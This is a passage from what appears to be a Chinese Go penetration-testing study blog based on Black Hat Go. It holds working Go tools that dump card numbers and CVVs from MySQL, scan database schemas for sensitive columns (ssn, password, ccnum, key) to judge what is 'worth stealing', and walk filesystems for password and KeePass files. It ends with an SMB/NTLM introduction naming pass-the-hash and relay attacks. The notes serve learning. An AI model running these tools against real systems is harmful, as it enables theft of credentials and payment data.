class="string">&quot;root:root@tcp(127.0.0.1:3306)/store&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">ccnum,date,cvv,exp <span class="type">string</span></span><br><span class="line">amount  <span class="type">float32</span></span><br><span class="line">)</span><br><span class="line">rows,err := db.Query(<span class="string">&quot;SELECT ccnum,date,amount,cvv,exp FROM transactions &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rows.Close()</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">err := rows.Scan(&amp;ccnum,&amp;date,&amp;amount,&amp;cvv,&amp;exp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(ccnum,date,cvv,exp)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> rows.Err() != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要引入匿名包，否则加载不了数据库的驱动</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220307155811.png"></p><h2 id="0x03-构建数据库矿工"><a href="#0x03-构建数据库矿工" class="headerlink" title="0x03 构建数据库矿工"></a>0x03 构建数据库矿工</h2><p>在本节中，我们将创建一个工具来检查数据库模式(例如列明)，以确定其中的数据是否值得窃取。</p><h3 id="1-首先实现一个接口"><a href="#1-首先实现一个接口" class="headerlink" title="1. 首先实现一个接口"></a>1. 首先实现一个接口</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> DatabaseMiner <span class="keyword">interface</span> &#123;</span><br><span class="line">GetSchema() (*Schema, <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Schema <span class="keyword">struct</span> &#123;</span><br><span class="line">Databases []Database</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Database <span class="keyword">struct</span> &#123;</span><br><span class="line">Name   <span class="type">string</span></span><br><span class="line">Tables []Table</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Table <span class="keyword">struct</span> &#123;</span><br><span class="line">Name    <span class="type">string</span></span><br><span class="line">Columns []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(m DatabaseMiner)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">s, err := m.GetSchema()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">re := getRegex()</span><br><span class="line"><span class="keyword">for</span> _, database := <span class="keyword">range</span> s.Databases &#123;</span><br><span class="line"><span class="keyword">for</span> _, table := <span class="keyword">range</span> database.Tables &#123;</span><br><span class="line"><span class="keyword">for</span> _, field := <span class="keyword">range</span> table.Columns &#123;</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> re &#123;</span><br><span class="line"><span class="keyword">if</span> r.MatchString(field) &#123;</span><br><span class="line">fmt.Println(database)</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] HIT: %s\n&quot;</span>, field)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getRegex</span><span class="params">()</span></span> []*regexp.Regexp &#123;</span><br><span class="line"><span class="keyword">return</span> []*regexp.Regexp&#123;</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)social`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)ssn`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)pass(word)?`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)hash`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)ccnum`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)card`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)security`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)key`</span>),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Schema)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">var</span> ret <span class="type">string</span></span><br><span class="line"><span class="keyword">for</span> _, database := <span class="keyword">range</span> s.Databases &#123;</span><br><span class="line">ret += fmt.Sprint(database.String() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Database)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">ret := fmt.Sprintf(<span class="string">&quot;[DB] = %+s\n&quot;</span>, d.Name)</span><br><span class="line"><span class="keyword">for</span> _, table := <span class="keyword">range</span> d.Tables &#123;</span><br><span class="line">ret += table.String()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t Table)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">ret := fmt.Sprintf(<span class="string">&quot;    [TABLE] = %+s\n&quot;</span>, t.Name)</span><br><span class="line"><span class="keyword">for</span> _, field := <span class="keyword">range</span> t.Columns &#123;</span><br><span class="line">ret += fmt.Sprintf(<span class="string">&quot;       [COL] = %+s\n&quot;</span>, field)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码首先定义了一个名为<code>DatabaseMiner</code>的接口，实现接口的任何数据类型都需要一个名为<code>GetSchema</code>的方法。每个后端数据库都可能有特定的逻辑来检索数据库模式。</p><p>定义一个<code>Schema</code>类型，该类型由也在此处定义的一些子类组成。我们使用<code>Schema</code>类型在逻辑上表示数据库架构，即数据库，表和列。接口中定义的函数<code>GetSchema()</code>希望返回一个 * Schema(Schema类型的指针)</p><p>现在定义一个名为<code>Search()</code>的函数，函数<code>Search()</code>希望在函数调用期间将<code>DatabaseMiner</code>实例传递给它。它将miner的值储存在一个名为<code>m</code>的变量中，然后使用<code>m.GetSchema()</code>来检索。然后循环遍历整个模式。再根据正则表达式(regex)值列表搜索匹配到的列明。如果能找到，则将数据库模式和匹配字段打印到屏幕上。</p><p>最后，定义一个名为<code>getRegex</code>的函数，此函数使用<code>Go</code>的<code>regex</code>包预编译正则表达式，并返回这些值的一部分。</p><h3 id="2-开始实现"><a href="#2-开始实现" class="headerlink" title="2. 开始实现"></a>2. 开始实现</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;database/sql&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-7/db/dbminer&quot;</span></span><br><span class="line">_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MySQLMiner <span class="keyword">struct</span> &#123;</span><br><span class="line">Host <span class="type">string</span></span><br><span class="line">Db   sql.DB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host <span class="type">string</span>)</span></span> (*MySQLMiner, <span class="type">error</span>) &#123;</span><br><span class="line">m := MySQLMiner&#123;Host: host&#125;</span><br><span class="line">err := m.connect()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;m, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MySQLMiner)</span></span> connect() <span class="type">error</span> &#123;</span><br><span class="line"></span><br><span class="line">db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, fmt.Sprintf(<span class="string">&quot;root:root@tcp(%s:3306)/information_schema&quot;</span>, m.Host))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">m.Db = *db</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MySQLMiner)</span></span> GetSchema() (*dbminer.Schema, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">new</span>(dbminer.Schema)</span><br><span class="line"></span><br><span class="line">sql := <span class="string">`SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM columns</span></span><br><span class="line"><span class="string">WHERE TABLE_SCHEMA NOT IN (&#x27;mysql&#x27;, &#x27;information_schema&#x27;, &#x27;performance_schema&#x27;, &#x27;sys&#x27;)</span></span><br><span class="line"><span class="string">ORDER BY TABLE_SCHEMA, TABLE_NAME`</span></span><br><span class="line">schemarows, err := m.Db.Query(sql)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> schemarows.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> prevschema, prevtable <span class="type">string</span></span><br><span class="line"><span class="keyword">var</span> db dbminer.Database</span><br><span class="line"><span class="keyword">var</span> table dbminer.Table</span><br><span class="line"><span class="keyword">for</span> schemarows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> currschema, currtable, currcol <span class="type">string</span></span><br><span class="line"><span class="keyword">if</span> err := schemarows.Scan(&amp;currschema, &amp;currtable, &amp;currcol); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> currschema != prevschema &#123;</span><br><span class="line"><span class="keyword">if</span> prevschema != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">s.Databases = <span class="built_in">append</span>(s.Databases, db)</span><br><span class="line">&#125;</span><br><span class="line">db = dbminer.Database&#123;Name: currschema, Tables: []dbminer.Table&#123;&#125;&#125;</span><br><span class="line">prevschema = currschema</span><br><span class="line">prevtable = <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> currtable != prevtable &#123;</span><br><span class="line"><span class="keyword">if</span> prevtable != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">&#125;</span><br><span class="line">table = dbminer.Table&#123;Name: currtable, Columns: []<span class="type">string</span>&#123;&#125;&#125;</span><br><span class="line">prevtable = currtable</span><br><span class="line">&#125;</span><br><span class="line">table.Columns = <span class="built_in">append</span>(table.Columns, currcol)</span><br><span class="line">&#125;</span><br><span class="line">db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">s.Databases = <span class="built_in">append</span>(s.Databases, db)</span><br><span class="line"><span class="keyword">if</span> err := schemarows.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">mm, err := New(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> mm.Db.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := dbminer.Search(mm); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-文件掠夺系统"><a href="#0x04-文件掠夺系统" class="headerlink" title="0x04 文件掠夺系统"></a>0x04 文件掠夺系统</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="title function_">import</span> <span class="params">(</span></span><br><span class="line"><span class="params"><span class="string">&quot;fmt&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;log&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;os&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;path/filepath&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;regexp&quot;</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">regexes</span> <span class="operator">=</span> []*regexp.Regexp&#123;</span><br><span class="line">regexp.MustCompile(`(?i)user`),</span><br><span class="line">regexp.MustCompile(`(?i)password`),</span><br><span class="line">regexp.MustCompile(`(?i)kdb`),</span><br><span class="line">regexp.MustCompile(`(?i)login`),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="title function_">walkFn</span><span class="params">(path string, f os.FileInfo, err error)</span> error &#123;</span><br><span class="line"><span class="keyword">for</span> _, r := range regexes &#123;</span><br><span class="line"><span class="keyword">if</span> r.MatchString(path) &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] HIT: %s\n&quot;</span>, path)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">root := os.Args[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> err := filepath.Walk(root, walkFn); err != nil &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">对数据库和文件系统的学习</summary>
    
    
    
    <category term="Go" scheme="https://h0ld1rs.github.io/categories/Go/"/>
    
    
    <category term="Golang" scheme="https://h0ld1rs.github.io/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(六)</title>
    <link href="https://h0ld1rs.github.io/posts/36907.html"/>
    <id>https://h0ld1rs.github.io/posts/36907.html</id>
    <published>2022-03-05T03:16:23.000Z</published>
    <updated>2022-03-23T14:25:32.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-六-–与SMB和NTLM交互"><a href="#Go渗透测试笔记-六-–与SMB和NTLM交互" class="headerlink" title="Go渗透测试笔记(六)–与SMB和NTLM交互"></a>Go渗透测试笔记(六)–与SMB和NTLM交互</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在前面的学习中，我们研究了用于网络通信的三种协议：TCP，HTTP和DNS，这次我们使用<code>SMB(服务器消息块)</code>(Server Message Block)协议来对网络协议进行讨论。<code>SMB</code>被证明是针对<code>Windows</code>系统后渗透中最有用的协议。</p><p>SMB具有多种用途，通常用于网上共享资源，例如，文件打印机和串行端口。如果有攻击意识，SMB允许通过命名管道在分布式网络节点之间进行通信。换句话说，你可以在远程主机上执行任意命令。这就需要用到<code>PsExec(一种在本地执行远程命令的windows工具)</code></p><p>SMB还有一些其他用途，主要得益于它处理<code>NTLM</code>身份的验证方法，该身份验证是<code>Windows</code>网络上大量使用的<code>质询--响应</code>安全协议。用途包括，远程密码猜测，基于散列的身份验证(pass-the-hash)，SMB中继和<code>NBNS/LLMNR</code>欺骗</p><h2 id="0x01-SMB包"><a href="#0x01-SMB包" class="headerlink" title="0x01 SMB包"></a>0x01 SMB包</h2><p>由于没有现成的SMB包，所以使用作者编写的</p><p><code>https://github.com/blackhat-go/bhg/tree/master/ch-6/smb</code></p><p>改天去挖掘一下源代码</p><h2 id="0x02-理解SMB"><a href="#0x02-理解SMB" class="headerlink" title="0x02 理解SMB"></a>0x02 理解SMB</h2><p>SMB是一种应用层协议，它类似于HTTP协议，允许网络节点之间互相通信。与HTTP1.1(使用ASCII 可读写文本进行通信)不同，SMB是一种二进制协议，使用固定长度和可变长度，位置与低字节序字段的组合。SMB有多个版本，2.0，2.1，3.0，3.0.2和3.1.1.由于每个版本的处理方式和要求各不相通，因此客户端和服务器必须事先约定好要使用哪个版本。</p><p>其中<code>Windows</code>系统支持多个版本，Microsoft提供了一个表格，显示在协商过程中要安装哪个版本</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220305120724.png"></p><p>图片来源：<a href="https://kb-cn.netapp.com/Advice_and_Troubleshooting/Data_Storage_Software/ONTAP_OS/What_is_the_default_negotiated_SMB_version_with_various_versions_of_Data_ONTAP_and_Windows_clients">https://kb-cn.netapp.com/Advice_and_Troubleshooting/Data_Storage_Software/ONTAP_OS/What_is_the_default_negotiated_SMB_version_with_various_versions_of_Data_ONTAP_and_Windows_clients</a></p><p>在这里，我们使用SMB 2.1</p><h3 id="1-理解SMB安全令牌"><a href="#1-理解SMB安全令牌" class="headerlink" title="1. 理解SMB安全令牌"></a>1. 理解SMB安全令牌</h3><p>SMB消息包含用于对网络中的用户和计算机进行身份验证的安全令牌。通过一系列会话消息来选择身份认证机制。该消息允许客户端和服务器就相互支持的身份验证类型达成一致。<code>Active Directory</code>域通常使用<code>NTLM</code>安全支持提供程序(NTLMSSP)，后者是一个二进制的网络协议，该协议将<code>NTLM</code>密码散列和<code>质询-响应</code>，令牌结合使用，以便在网络上进行用户的身份认证。</p><blockquote><p>质询-响应令牌可以理解为一个加密答案，除了NTLMSSP之外，还有一种常见的身份认证机制，即<code>Kerberos</code></p></blockquote><p>将身份认证机制与SMB规范分开，可以使SMB在不同的环境中使用不同的身份验证方法。具体取决于域和企业的安全要求，以及客户端-服务器的支持。但是，将身份验证机制和SMB规范分开，使Go创建更加困难。而格式与我们将用于普通的SMB的位置二进制编码不同，这种混合编码增加了复杂性。</p><h3 id="2-创建一个SMB会话"><a href="#2-创建一个SMB会话" class="headerlink" title="2. 创建一个SMB会话"></a>2. 创建一个SMB会话</h3><p>客户端和服务器执行以下过程以成功设置<code>SMB2.1</code>会话并选择<code>NTLPSSP</code>方言</p><ol><li><p>客户端向服务器发送协商协议(Negotiate Protocol)请求，该消息中包含客户端支持的方言列表。</p></li><li><p>服务器以协商协议响应消息作为响应，该消息表明服务器选择的方言，将来的消息都将使用该方言，响应中包含服务器支持的身份验证机制列表。</p></li><li><p>客户端选择一种受支持的身份验证类型，例如<code>NTLMSSP</code>，并使用该信息创建会话设置请求消息发送到服务器，该消息中包含一个序列化的安全结构，表明他是<code>NTLMSSP</code>协商请求</p></li><li><p>服务器以会话设置响应消息答复。此消息表明需要更多处理，且此消息中包含服务器质询令牌。</p></li><li><p>客户端计算用户的<code>NTLM</code>散列值(使用域，用户密码作为输入)，，然后将其与服务器质询，随机客户端质询和其他数据结合起来生成质询响应。它包含在客户端发送给服务器的新会话设置请求消息中。而该消息中包含的序列化的安全结构规则表明其是<code>NTLMSSP</code>身份验证请求。这样，服务器就可以区分两个会话设置<code>SMB</code>请求。</p></li><li><p>服务器与权威性资源(例如使用域凭据进行身份验证的域控制器)进行交互。以将客户端提供的质询-响应信息与权威性紫泉计算出的值进行比较，如果他们匹配，则对客户端进行身份认证，服务器会话设置响应消息发送给客户端，表示登录成功(该消息中包含客户端，可以用来跟踪会话状态的唯一会话标识符)</p></li><li><p>客户端发送其他消息以访问文件共享，命名管道，打印机等，每个消息都包含特定的会话标识符，服务器可以通过该标识符来验证客户端的身份状态。</p></li></ol><p>以下是一些相关规范</p><blockquote><p>MS-SMB2</p><p>MS-SPNG 和 RFC 4178 封装了 MS-NLMP数据的<code>GSS-API</code>规范</p><p>MS-NTLM</p><p>AN&#x3D;SN.1</p></blockquote><h3 id="3-使用结构域的混合编码"><a href="#3-使用结构域的混合编码" class="headerlink" title="3. 使用结构域的混合编码"></a>3. 使用结构域的混合编码</h3><p>SMB规范要求对大多数消息数据进行位置，二进制，低字节序，固定和可变长度编码。但是某些字段需要进行<code>ASN.1</code>编码，该字段使用显式标记符来标识字段索引，类型和长度。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Type Foo <span class="keyword">struct</span>&#123;</span><br><span class="line">    x <span class="type">int</span></span><br><span class="line">    y []<span class="type">byte</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Message <span class="keyword">struct</span>&#123;</span><br><span class="line">    A <span class="type">int</span> <span class="comment">//二进制，位置编码</span></span><br><span class="line">    B Foo <span class="comment">//规范要求的ASN.1 编码</span></span><br><span class="line">    C <span class="type">bool</span> <span class="comment">// 二进制，位置编码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无法使用i相同的编码方案对结构体<code>Message</code>中的所有类型进行编码，因为<code>Foo</code>类型的B字段需要使用<code>ASN.1</code>编码</p><h4 id="1-编写自定义的序列化和反序列化结构"><a href="#1-编写自定义的序列化和反序列化结构" class="headerlink" title="1. 编写自定义的序列化和反序列化结构"></a>1. 编写自定义的序列化和反序列化结构</h4><p>Go的二进制包的行为方式与它递归地对所有结构体字段进行编码的方式相同。但没有什么用，因为需要混合编码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binary.Write(someWriter,binary.LittleEndian,message)</span><br></pre></td></tr></table></figure><p>要解决此问题，可以创建一个接口，该接口允许任意类型的自定义序列化和反序列化逻辑</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BinaryMarshallable <span class="keyword">interface</span> &#123;</span><br><span class="line">MarshalBinary(*Metadata) ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br><span class="line">UnmarshalBinary([]<span class="type">byte</span>, *Metadata) <span class="type">error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-包装接口"><a href="#2-包装接口" class="headerlink" title="2. 包装接口"></a>2. 包装接口</h4><p>任何实现了接口<code>BinaryMarshallable</code>的类型都可以控制自己的编码，我们需要创建包装函数<code>marsgal()</code>和<code>unmarshal()</code>，在其中检查数据以确定该类型是否实现了接口<code>BinaryMarshakkable</code>，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 